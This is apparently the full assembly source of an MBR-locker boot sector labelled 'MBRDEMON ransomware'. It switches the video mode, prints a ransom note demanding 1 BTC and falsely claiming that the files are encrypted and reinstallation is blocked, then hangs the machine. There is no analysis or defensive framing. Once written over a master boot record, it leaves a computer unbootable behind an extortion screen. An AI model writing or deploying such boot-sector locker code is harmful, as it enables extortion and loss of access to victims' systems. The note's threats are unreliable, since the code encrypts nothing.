[BITS 16]
[ORG 7C00h]
    jmp     main
main:
    xor     ax, ax     ; DS=0
    mov     ds, ax
    cld                ; DF=0 because our LODSB requires it
    mov     ax, 0012h  ; Select 640x480 16-color graphics video mode
    int     10h
    mov     si, string
    mov     bl, 9      ; Red
    call    printstr
    jmp     $

printstr:
    mov     bh, 0     ; DisplayPage
print:
    lodsb
    cmp     al, 0
    je      done
    mov     ah, 0Eh   ; BIOS.Teletype
    int     10h
    jmp     print
done:
    ret

string db "You became a victim of the MBRDEMON ransomware!", 13, 10, "All your files are encrypted with a special algorithm and your mbr is locked.", 13, 10, "Only way to get your data back is to pay me a price of 1 BTC", 13, 10, "All other attempts to restore data will fail", 13, 10, "Reinstalling Windows has been blocked", 13, 10, "Enter decryption key:"

times 510 - ($-$$) db 0
dw      0AA55h